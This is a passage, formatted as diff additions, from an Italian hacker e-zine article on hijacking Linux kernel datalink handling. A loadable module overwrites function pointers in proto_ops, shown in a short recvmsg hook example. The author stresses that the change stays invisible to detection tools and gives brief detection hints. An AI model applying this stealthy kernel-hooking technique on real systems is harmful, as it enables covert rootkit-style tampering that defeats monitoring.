+ancora creare una propria statistica con dati fasulli o...).
+
+  La seconda e' che una volta loadato LKM, quando si crea una socket, entrano
+in funzione MOD_INC_USE_COUNT e MOD_DEC_USE_COUNT, quindi sino a che tutte
+le socket non sono state rilasciate, l'LKM non si potra' unloadare.
+
+  Probabilmente, la decisione di modificare alla radice la gestione del
+datalink, partendo da packet_create, potrebbe essere un po' azzardata, e
+anche inutile, volendo. Si puo' allora agire diversamente, controllando
+singole funzioni, del tipo packet_recvmsg o packet_sendmsg, ma la limitazione
+principale e' che non si puo' unloadare a piacimento l'LKM, nel senso che
+sino al rilascio della socket non si puo' far nulla se non con ovvie
+conseguenze: un piacevolissimo dump dello stack...
+
+  L'esempio che segue mostra quest'altra tecnica:
+
+    int (*o_recvmsg)
+    (struct socket *s, struct msghdr *m, int l, int f, struct scm_cookie *scm);
+
+    /**
+     cast proto_ops, *ops now has the original struct:
+     OPS is the address of struct proto_ops automatically
+     defined during compilation...
+    **/
+    struct proto_ops *ops = (struct proto_ops *)0x[...];
+
+    static int n_recvmsg
+    (struct socket *s, struct msghdr *m, int l, int f, struct scm_cookie *scm)
+    {
+            dbg("recieved packet -- go on...\n");
+
+            return (o_recvmsg(s, m, l, f, scm));
+    }
+
+    static int ops_init (void)
+    {
+            /** saving old func **/
+            o_recvmsg = ops->recvmsg;
+            dbg("o_recvmsg......... %p\n", o_recvmsg);
+            /** setting new func **/
+            ops->recvmsg = n_recvmsg;
+            dbg("ops->recvmsg...... %p\n", ops->recvmsg);
+
+            return (0);
+    }
+
+    static void ops_exit (void)
+    {
+            /** resetting old func **/
+            dbg("ops->recvmsg...... %p\n", ops->recvmsg);
+            ops->recvmsg = o_recvmsg;
+            dbg("ops->recvmsg______ %p\n", ops->recvmsg);
+
+            return;
+    }
+
+    ...
+    ...
+
+  Modificando packet_rcv controlliamo la ricezione dei pacchetti, scartando,
+dirottando, trasmettendo quelli che ci interessano... Anche se tutte queste
+operazioni sono un po' piu' complicate delle precedenti, lavorando tra
+'struct msghdr *' o 'struct scm_cookie *', che abbisognano di una discreta
+conoscenza dei loro campi e di altre funzioni a loro utili...
+
+  Un altro discorso si dovrebbe fare per quelle volte che af_packet non la si
+trova compilata staticamente nel kernel...
+
+  Allora le mosse sono due: modificare _senza alcuno scrupolo_ il modulo
+packet.o che si trova nella solita directory; o agire sulle strutture _ora_
+davvero esportate, consultabili facilmente tramite ksyms e altro. E il gioco
+e' fatto. Ma non so sino a che punto il codice d'esempio possa servire, se
+vi trovate in una situazione del genere.
+
+
+
+- C o n c l u s i o n i
+
+  L'utilita' di fare dell'hacking sul layer datalink non esiste, se non in
+scenari di pura battaglia contro qualche sfortunato server che e' capitolato
+sotto la morsa di uno dei tanti presunti hackeri (ma tant'e'...).
+
+  La possibilita', invece, di poter reimplementare la gestione del suddetto
+layer a nostro piacimento e senza alcuna modifica diretta al codice del
+kernel, via patch e simili, e' molto interessante.
+
+  Ma a parte il datalink, la chiave di lettura di queste righe dovrebbe essere
+l'hijaction delle funzioni di strutture. All'interno del kernel vi sono
+davvero tante opzioni, a partire dai file, attraversando il network layer,
+sino ad arrivare alla gestione della vm... ebbene, volendo modificar qualcosa,
+con la tecnica sopra esposta si modificano delle funzioni in modo trasparente,
+senza lasciar byte o wrapper sparsi per la memoria, e comunque del tutto
+invisibile a tools atti alla scoperta di 'anomalie' nel sistema...
+
+  La modifica di funzioni che si trovano all'interno di strutture non implica
+la modifica di codice 'visibile', ne' tanto meno quella di sys_call...
+
+  Volendo proprio scovare le modifiche, si dovrebbe _prima_ capire qual'e' la
+parte modificata, e dopo, magari, confrontare gli indirizzi di memoria di
+tutte le funzioni che fan parte di quella struttura, con quelli di System.map,
+e cosi' via.
+
+  Ma converrete con me, che per trovare qualcosa che non va, bisogna farsi del
+male... allora non so, magari un tool lo implemento davvero.
+
+  Riguardo al codice ho gia' detto tutto, e con le spiegazioni di sopra non
+dovrebbe essere difficile capire di che si tratta. _Ripeto che, a parte
+piccole modifiche, il codice e' esattamente quello del kernel, quindi potreste
+approfittarne per studiarvi un po' questo._
+
+  L'LKM dovrebbe lavorare su tutti i kernel 2.4.x, e probabilmente anche su
+2.2.x modificando leggermente il codice. Su 2.4.5, 2.4.7, 2.4.9, 2.4.14,
+2.4.16, 2.4.17, 2.4.18 funzionano perfettamente. Ho testato gli LKM anche su
+kernel delle serie 2.5.x, sino alla 2.5.7, e funziano lo stesso, perche' a
+parte alcune macro, af_packet.c e' rimasto tale e quale a com'era prima.
+
+  Nei file .h trovate alcune banalita' che mi hanno risolto i problemi quando
+testavo su 2.2.x, tipo le macro 'module_init' e 'module_exit', che non erano
+ancora presenti, o il controllo della versione del kernel per l'utilizzo del
+proc_file_system con 2.4.x. Ma nulla di grave, comunque...
+
+  Da notare: il Makefile cerca un System.map-x.x.x in /boot, (dove dovrebbe
+essere), ma se non e' quello del kernel che e' usato in quel momento, trovera'
+degli indirizzi errati, compromettendone poi il suo utilizzo, quindi se qualcosa
+va male, vedete dal debug che gli indirizzi sono tutti uguali a zero, o cose
+simili, cercate di metter il System.map al posto giusto.
+
+  Per ovviare alla ricerca in System.map, che in alcune occasioni potrebbe
+essere irrintracciabile ;) potreste provare ad implementare un parser di
+istruzioni in esadecimale, e con questo scovare l'indirizzo utile tramite
+kmem, o tante altre cose ancora... io non ho piu' tempo.
+
+  Spero di essere stato utile, e che una lontana idea di come lavori il
+datalink l'abbiate in mente, dopo aver letto tutto.
+
+  Naturalmente, applicando questa tecnica, le cose che si possono fare sono
+davvero tante, agendo per esempio sulla struttura 'socket_file_ops', si
+potrebbe davvero _ricostruire_ tutto il network layer a nostro piacimento,
+per non parlare del filesystem o della gestione dei processi...
+
+  L'unico limite, come di solito e' in queste situazioni, e' la vostra
+fantasia... ora sta a voi mettere le mani sopra del codice, e creare qualcosa
+che possa stupire, e che va _al di la'_ delle ideologie politiche e non...
+
+  Per puro hacking... eh?
+
+  ByeZ, raga...
+
+
+
+- D o c u m e n t a z i o n e
+
+  [1] libpcap      -  ftp://ftp.ee.lbl.gov/libpcap.tar.Z
+  [2] tcpdump      -  ftp://ftp.ee.lbl.gov/tcpdump.tar.Z
+      snort        -  http://www.snort.org http://snort.sourceforge.net
+  [3] StMichael    -  http://www.sourceforge.net/projects/stjude
+  [4] Silvio       -  http://www.big.net.au/~silvio/
+  [5] Phrack58     -  Linux on-the-fly kernel patching without LKM
+  [6] BFi|s0ftpj   -  http://www.s0ftpj.org/bfi/dev/BFi11-dev-02
+  [7] Phrack58     -  Sub proc_root Quando Sumus (Advances in Kernel Hacking)
+
+  NetFilter HOWTOs -  http://www.netfileter.org
+  Kernel sources   -  /usr/src/linux-2.4.x/*
+
+
+
+-[ WEB ]----------------------------------------------------------------------
+
+        http://www.bfi.cx
+        http://www.s0ftpj.org/bfi/
+        http://bfi.itapac.net
+
+
+-[ E-MAiL ]-------------------------------------------------------------------
+
+        bfi@s0ftpj.org
+
+
+-[ PGP ]----------------------------------------------------------------------
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3i
+
+mQENAzZsSu8AAAEIAM5FrActPz32W1AbxJ/LDG7bB371rhB1aG7/AzDEkXH67nni
+DrMRyP+0u4tCTGizOGof0s/YDm2hH4jh+aGO9djJBzIEU8p1dvY677uw6oVCM374
+nkjbyDjvBeuJVooKo+J6yGZuUq7jVgBKsR0uklfe5/0TUXsVva9b1pBfxqynK5OO
+lQGJuq7g79jTSTqsa0mbFFxAlFq5GZmL+fnZdjWGI0c2pZrz+Tdj2+Ic3dl9dWax
+iuy9Bp4Bq+H0mpCmnvwTMVdS2c+99s9unfnbzGvO6KqiwZzIWU9pQeK+v7W6vPa3
+TbGHwwH4iaAWQH0mm7v+KdpMzqUPucgvfugfx+kABRO0FUJmSTk4IDxiZmk5OEB1
+c2EubmV0PokBFQMFEDZsSu+5yC9+6B/H6QEBb6EIAMRP40T7m4Y1arNkj5enWC/b
+a6M4oog42xr9UHOd8X2cOBBNB8qTe+dhBIhPX0fDJnnCr0WuEQ+eiw0YHJKyk5ql
+GB/UkRH/hR4IpA0alUUjEYjTqL5HZmW9phMA9xiTAqoNhmXaIh7MVaYmcxhXwoOo
+WYOaYoklxxA5qZxOwIXRxlmaN48SKsQuPrSrHwTdKxd+qB7QDU83h8nQ7dB4MAse
+gDvMUdspekxAX8XBikXLvVuT0ai4xd8o8owWNR5fQAsNkbrdjOUWrOs0dbFx2K9J
+l3XqeKl3XEgLvVG8JyhloKl65h9rUyw6Ek5hvb5ROuyS/lAGGWvxv2YJrN8ABLo=
+=o7CG
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+==============================================================================
+-----------------------------------[ EOF ]------------------------------------
+==============================================================================
